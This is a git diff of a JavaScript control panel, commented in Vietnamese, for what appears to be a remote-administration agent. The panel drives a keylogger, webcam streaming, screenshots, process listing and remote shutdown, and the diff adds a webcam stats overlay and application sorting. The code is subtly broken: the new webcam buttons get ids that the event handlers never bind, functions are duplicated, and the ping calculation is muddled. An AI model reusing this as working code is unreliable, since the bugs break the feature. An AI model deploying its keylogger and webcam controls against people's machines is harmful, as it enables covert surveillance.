@@ -11,6 +11,22 @@ document.getElementById('agent-id-display').textContent = agentId;
 let globalProcessData = []; 
 let currentSort = { column: 'pid', direction: 'asc' }; 
 
+//  Biến cho Sort Ứng Dụng
+let globalAppData = [];
+let currentAppSort = { column: 'name', direction: 'asc' };
+
+// --- BIẾN MỚI CHO STATS VÀ FPS ---
+let isStatsVisible = false;
+let lastFrameTime = performance.now();
+let currentFPS = 0;
+let currentPing = 0; // Ping sẽ được mô phỏng/ước tính (vì SignalR không có ping trực tiếp)
+let framesReceived = 0;
+let lastSampleTime = performance.now();
+const SAMPLE_INTERVAL_MS = 500; // Cập nhật FPS/Rate mỗi 500ms (0.5 giây)
+let currentFrameSize = 0; // Kích thước frame gần nhất (bytes)
+let totalDataReceived = 0; // Tổng dữ liệu nhận được (bytes)
+let totalTimeElapsed = 0; // Tổng thời gian đã trôi qua (ms)
+let lastFPSUpdateTime = performance.now(); // Thời gian cập nhật FPS/Rate gần nhất
 
 // --- HÀM SIGNALR CORE ---
 function startSignalR(username, password) {
@@ -104,6 +120,7 @@ function handleResponse(data) {
     if (!data) return;
 
     if (currentView === 'applications' && Array.isArray(data.response)) {
+        globalAppData = data.response;
         updateAppTable(data.response);
     } 
     else if (currentView === 'processes' && Array.isArray(data.response)) {
@@ -122,6 +139,7 @@ function handleResponse(data) {
         if(currentView === 'webcam') {
             const videoElement = document.getElementById('webcam-stream');
             const placeholder = document.getElementById('webcam-placeholder');
+            const stats = document.getElementById('webcam-stats-overlay');
             
             if(videoElement) {
                 videoElement.style.display = 'none'; // Ẩn thẻ video
@@ -131,6 +149,8 @@ function handleResponse(data) {
                 placeholder.style.display = 'flex'; // Hiện lại placeholder (text 'Camera Off')
                 placeholder.innerHTML = '<i class="fas fa-video-slash fa-2x mb-2 text-slate-400"></i><br>Webcam đang tắt';
             }
+            if (stats) stats.style.display = 'none';
+            currentFPS = 0; // Reset FPS
         }
     }
     else if (data.response === 'started') {
@@ -154,8 +174,28 @@ function handleRealtimeUpdate(data) {
     }
 }
 
-function handleBinaryStream(data) {
+
+function toggleStats() {
+    isStatsVisible = !isStatsVisible;
+    const statsOverlay = document.getElementById('webcam-stats-overlay');
+    const statsButton = document.getElementById('toggle-stats-btn');
+    
+    if (statsOverlay) {
+        statsOverlay.style.display = isStatsVisible ? 'block' : 'none';
+    }
+    if (statsButton) {
+        statsButton.classList.toggle('bg-blue-600', isStatsVisible);
+        statsButton.classList.toggle('text-white', isStatsVisible);
+    }
+}
+
+function handleBinaryStream(data, frameSize = 0, senderTicks = 0) {
     const view = currentView;
+    // Dùng Date.now() để tính Ping (thời gian thực)
+    const nowRealTime = Date.now(); 
+    // Dùng performance.now() để tính FPS (độ mượt)
+    const nowPerf = performance.now();
+
     if (view === 'screenshot' && screenshotPending && data.startsWith("data:")) {
         const img = document.getElementById('screenshot-image');
         img.src = data;
@@ -166,6 +206,43 @@ function handleBinaryStream(data) {
         updateStatus("Đã nhận ảnh.", 'success');
     }
     if (view === 'webcam' && data.startsWith("data:image")) {
+        const now = performance.now();
+        const elapsedSinceLastFrame = now - lastFrameTime;
+
+        // Công thức chuyển C# Ticks sang Javascript Time chuẩn xác hơn:
+        // C# Ticks bắt đầu từ năm 0001, JS từ năm 1970. 
+        // Số 621355968000000000 là khoảng cách giữa 2 mốc này.
+        const ticksToMicrotime = (senderTicks - 621355968000000000) / 10000;
+
+        // --- 1. TÍNH PING (ĐỘ TRỄ) ---
+        // Chuyển ticks về DateTime, tính chênh lệch với thời gian hiện tại
+        const sentTime = (new Date(senderTicks / 10000 + Date.UTC(0, 0, 1))).getTime();currentPing = Math.max(0, nowRealTime - ticksToMicrotime);
+
+        // --- 2. TÍNH FPS VÀ BITRATE TRUNG BÌNH ---
+        
+        framesReceived++;
+        totalDataReceived += frameSize;
+        currentFrameSize = frameSize;
+        
+        if (now - lastSampleTime >= SAMPLE_INTERVAL_MS) {
+            totalTimeElapsed = now - lastSampleTime;
+            
+            // FPS trung bình trong 500ms vừa qua
+            currentFPS = framesReceived / (totalTimeElapsed / 1000);
+            
+            // Cập nhật Overlay
+            updateWebcamStats(); 
+
+            // Reset bộ đếm
+            framesReceived = 0;
+            lastSampleTime = now;
+        }
+
+        lastFrameTime = now;
+        
+        // Cập nhật Overlay
+        updateWebcamStats();
+
         const video = document.getElementById('webcam-stream');
         const placeholder = document.getElementById('webcam-placeholder');
         
@@ -176,6 +253,33 @@ function handleBinaryStream(data) {
             video.src = data;
         }
     }
+}
+
+function updateWebcamStats() {
+    const overlay = document.getElementById('webcam-stats-overlay');
+    if (!overlay) return;
+    
+    // Stats for Nerds: Hiển thị chi tiết
+    if (isStatsVisible) {
+        const resolution = '1280x720'; // Lấy từ cấu hình Agent
+        const bitrateKBps = (currentFrameSize / 1024) * currentFPS; // Ước tính Bitrate (KB/s, 85 là chất lượng nén)
+
+        overlay.innerHTML = `
+            <div class="text-sm font-mono text-white/90 p-2 space-y-0.5">
+                <p>FPS: <span class="font-bold text-green-400">${currentFPS.toFixed(1)}</span></p>
+                <p>Ping: <span class="font-bold text-yellow-400">${currentPing.toFixed(0)} ms</span></p>
+                <p>Res: <span class="font-bold text-cyan-400">${resolution}</span></p>
+                <p>Rate: <span class="font-bold text-purple-400">${bitrateKBps.toFixed(1)} KB/s</span></p>
+                <p>Size: <span class="font-bold text-slate-300">${(currentFrameSize / 1024).toFixed(1)} KB</span></p>
+            </div>
+        `;
+    } else {
+        // Chế độ đơn giản: Chỉ hiện chữ LIVE
+        overlay.innerHTML = `
+            <p class="text-white bg-red-600 text-xs px-2 py-1 rounded font-bold uppercase tracking-widest">LIVE</p>
+        `;
+    }
+    overlay.style.display = 'block'; // Đảm bảo nó hiện
 }
 
 // --- UI HELPER FUNCTIONS ---
@@ -268,8 +372,48 @@ function renderScreenshotView() {
     return `<div class="space-y-6 text-center"><button id="capture-btn" class="btn-primary bg-blue-600 text-white px-6 py-3 rounded-lg">Chụp Màn Hình</button><div class="bg-gray-100 border-2 border-dashed p-6"><p id="screenshot-placeholder" class="text-gray-500">Chưa có ảnh</p><img id="screenshot-image" class="hidden max-w-full mx-auto shadow-lg"></div><button id="save-screenshot-btn" class="hidden btn-primary bg-green-600 text-white px-6 py-3 rounded-lg">Lưu Ảnh</button></div>`;
 }
 function renderKeyloggerDisplay() { return `<div class="space-y-4"><div class="space-x-2"><button id="start-key" class="bg-green-600 text-white px-4 py-2 rounded">Bắt Đầu</button><button id="stop-key" class="bg-red-600 text-white px-4 py-2 rounded">Dừng</button><button id="clear-key" class="bg-gray-500 text-white px-4 py-2 rounded">Xóa</button></div><p id="keylogger-status" class="text-blue-600 font-bold"></p><textarea id="keylogger-log" class="w-full h-64 border p-2 font-mono" readonly></textarea></div>`; }
-function renderWebcamControl() { return `<div class="space-y-4 text-center"><div class="space-x-2"><button id="cam-on" class="bg-green-600 text-white px-4 py-2 rounded">Bật Cam</button><button id="cam-off" class="bg-red-600 text-white px-4 py-2 rounded">Tắt Cam</button></div><div class="bg-black rounded-lg overflow-hidden min-h-[300px] relative flex items-center justify-center"><div id="webcam-placeholder" class="text-gray-500 flex flex-col items-center"><i class="fas fa-video-slash fa-2x mb-2 text-slate-600"></i><span>Camera Off</span></div><img id="webcam-stream" class="w-full h-auto block" style="display:none"></div></div>`; }
-function renderSystemControls() { return `<div class="flex gap-4 justify-center mt-10"><button id="shutdown-btn" class="bg-red-600 text-white px-8 py-4 rounded-xl font-bold shadow-lg hover:bg-red-700">SHUTDOWN</button><button id="restart-btn" class="bg-yellow-600 text-white px-8 py-4 rounded-xl font-bold shadow-lg hover:bg-yellow-700">RESTART</button></div>`; }
+function renderWebcamControl() { 
+    return `
+        <div class="space-y-4">
+            <p class="text-lg font-semibold text-red-600 bg-red-100 p-3 rounded-lg shadow">
+                <i class="fas fa-exclamation-triangle mr-2"></i> CẢNH BÁO: Truy cập Webcam Agent.
+            </p>
+            <div class="flex justify-between items-center">
+                <div class="flex space-x-3">
+                    <button id="webcam-on-btn" class="btn-primary bg-green-600 text-white px-6 py-3 rounded-lg shadow hover:bg-green-700 transition-all font-semibold">
+                        <i class="fas fa-video mr-2"></i> Bật Webcam
+                    </button>
+                    <button id="webcam-off-btn" class="btn-primary bg-red-600 text-white px-6 py-3 rounded-lg shadow hover:bg-red-700 transition-all font-semibold">
+                        <i class="fas fa-stop mr-2"></i> Tắt Webcam
+                    </button>
+                </div>
+                
+                <!-- THÊM NÚT BẬT/TẮT STATS -->
+                <button id="toggle-stats-btn" class="text-slate-600 bg-slate-100 px-4 py-2 rounded-lg text-sm font-medium hover:bg-slate-200 transition-colors">
+                    <i class="fas fa-cogs mr-1"></i> Stats for Nerds
+                </button>
+            </div>
+            
+            <div id="webcam-area" class="bg-gray-900 border-2 border-gray-700 rounded-lg p-2 text-center overflow-hidden min-h-[300px] relative flex items-center justify-center">
+                
+                <!-- THÊM OVERLAY THỐNG KÊ (Nằm trên video) -->
+                <div id="webcam-stats-overlay" class="absolute top-3 left-3 bg-black/50 p-2 rounded-lg pointer-events-none" style="display: block;">
+                    <!-- Mặc định chỉ hiện LIVE, sẽ được updateWebcamStats() ghi đè -->
+                    <p class="text-white bg-red-600 text-xs px-2 py-1 rounded font-bold uppercase tracking-widest">LIVE</p>
+                </div>
+                
+                <div id="webcam-placeholder" class="text-gray-500 flex flex-col items-center">
+                    <i class="fas fa-video-slash fa-2x mb-2 text-slate-600"></i>
+                    <span>Camera Off</span>
+                </div>
+                <img id="webcam-stream" src="" alt="Video Webcam Agent" class="w-full h-auto block" style="display:none" />
+            </div>
+        </div>
+    `;
+}
+function renderSystemControls() { 
+    return `<div class="flex gap-4 justify-center mt-10"><button id="shutdown-btn" class="bg-red-600 text-white px-8 py-4 rounded-xl font-bold shadow-lg hover:bg-red-700">SHUTDOWN</button><button id="restart-btn" class="bg-yellow-600 text-white px-8 py-4 rounded-xl font-bold shadow-lg hover:bg-yellow-700">RESTART</button></div>`; 
+}
 
 function showModal(title, msg, confirmFn, isInfo=false) {
     const c = document.getElementById('modal-container');
@@ -338,7 +482,20 @@ function switchView(view) {
     }
     else if(view === 'screenshot') { area.innerHTML = renderScreenshotView(); document.getElementById('capture-btn').onclick = () => {screenshotPending=true; document.getElementById('screenshot-image').style.display='none'; document.getElementById('screenshot-placeholder').style.display='block'; sendCommand('screenshot');}; document.getElementById('save-screenshot-btn').onclick = () => { const link = document.createElement('a'); link.href = document.getElementById('screenshot-image').src; link.download = prompt("Tên file:", "screenshot.png") || "screenshot.png"; link.click(); }; }
     else if(view === 'keylogger') { area.innerHTML = renderKeyloggerDisplay(); document.getElementById('start-key').onclick = () => sendCommand('keylogger_start'); document.getElementById('stop-key').onclick = () => sendCommand('keylogger_stop'); document.getElementById('clear-key').onclick = () => document.getElementById('keylogger-log').value = ''; }
-    else if(view === 'webcam') { area.innerHTML = renderWebcamControl(); document.getElementById('cam-on').onclick = () => {sendCommand('webcam_on'); document.getElementById('webcam-placeholder').innerHTML = '<div class="loader mb-2"></div> Đang kết nối...';}; document.getElementById('cam-off').onclick = () => sendCommand('webcam_off'); }
+    else if(view === 'webcam') { 
+        area.innerHTML = renderWebcamControl(); 
+        document.getElementById('cam-on').onclick = () => {
+            sendCommand('webcam_on'); 
+            const placeholder = document.getElementById('webcam-placeholder');
+            if(placeholder) placeholder.innerHTML = '<div class="loader mb-2"></div> Đang kết nối...';
+            // Cập nhật: Khởi tạo Stats khi bật cam
+            updateWebcamStats();
+        }; 
+        document.getElementById('cam-off').onclick = () => sendCommand('webcam_off'); 
+        
+        // BIND SỰ KIỆN NÚT STATS
+        document.getElementById('toggle-stats-btn').onclick = toggleStats;
+    }
     else if(view === 'system') { area.innerHTML = renderSystemControls(); document.getElementById('shutdown-btn').onclick = () => showModal("Cảnh báo", "Tắt máy?", () => sendCommand('shutdown')); document.getElementById('restart-btn').onclick = () => showModal("Cảnh báo", "Khởi động lại?", () => sendCommand('restart')); }
 }
 
@@ -351,7 +508,45 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('logout-btn').onclick = doLogout;
 });
 
-// --- LOGIC SẮP XẾP TIẾN TRÌNH (TAM GIÁC) ---
+// ==========================================
+// LOGIC SẮP XẾP ỨNG DỤNG (MỚI)
+// ==========================================
+
+function sortAppTable(column) {
+    if (currentAppSort.column === column) {
+        currentAppSort.direction = currentAppSort.direction === 'asc' ? 'desc' : 'asc';
+    } else {
+        currentAppSort.column = column;
+        currentAppSort.direction = 'asc'; // Mặc định tăng dần cho text
+    }
+    updateAppTable();
+}
+
+function getAppSortIcon(column) {
+    const active = currentAppSort.column === column;
+    const iconName = active 
+        ? (currentAppSort.direction === 'asc' ? 'fa-caret-down' : 'fa-caret-up')
+        : 'fa-caret-right';
+    
+    const styleClass = active 
+        ? 'text-blue-600 bg-blue-50 border-blue-200 shadow-sm ring-1 ring-blue-200' 
+        : 'text-gray-400 bg-gray-50 border-gray-200 hover:bg-gray-100 hover:text-gray-600';
+
+    return `<span class="sort-btn ml-2 w-5 h-5 inline-flex items-center justify-center rounded-md border ${styleClass} transition-all cursor-pointer" title="Sắp xếp">
+        <i class="fas ${iconName} text-xs"></i>
+    </span>`;
+}
+
+function updateAppSortIcons() {
+    ['name', 'path', 'status'].forEach(col => {
+        const span = document.querySelector(`th[onclick="sortAppTable('${col}')"] span`);
+        if(span) span.outerHTML = getAppSortIcon(col);
+    });
+}
+
+// ==========================================
+// LOGIC SẮP XẾP TIẾN TRÌNH
+// ==========================================
 
 function sortProcessTable(column) {
     if (currentSort.column === column) {
@@ -769,27 +964,6 @@ function renderKeyloggerDisplay() {
     `;
 }
 
-function renderWebcamControl() {
-    return `
-        <div class="space-y-6">
-            <p class="text-lg font-semibold text-red-600 bg-red-100 p-3 rounded-lg shadow">
-                <i class="fas fa-exclamation-triangle mr-2"></i> CẢNH BÁO: Truy cập Webcam Agent.
-            </p>
-            <div class="flex space-x-3">
-                <button id="webcam-on-btn" class="btn-primary bg-green-600 text-white px-6 py-3 rounded-lg shadow hover:bg-green-700 transition-all font-semibold">
-                    <i class="fas fa-video mr-2"></i> Bật Webcam
-                </button>
-                <button id="webcam-off-btn" class="btn-primary bg-red-600 text-white px-6 py-3 rounded-lg shadow hover:bg-red-700 transition-all font-semibold">
-                    <i class="fas fa-stop mr-2"></i> Tắt Webcam
-                </button>
-            </div>
-            <div id="webcam-area" class="bg-gray-900 border-2 border-gray-700 rounded-lg p-2 text-center overflow-hidden min-h-[300px] flex items-center justify-center relative">
-                 <span id="webcam-placeholder" class="text-gray-500"><i class="fas fa-video-slash fa-2x"></i><br>Webcam đang tắt</span>
-                <img id="webcam-stream" src="" alt="Video Webcam Agent" class="w-full h-auto rounded-md hidden" />
-            </div>
-        </div>
-    `;
-}
 
 function renderSystemControls() {
     return `
@@ -935,6 +1109,12 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     document.getElementById('logout-btn').addEventListener('click', doLogout);
+
+    document.getElementById('app').addEventListener('click', (e) => {
+        if (e.target.id === 'toggle-stats-btn') {
+            toggleStats();
+        }
+    });
 
     // Switch view to default initially (but hidden)
     switchView(currentView);
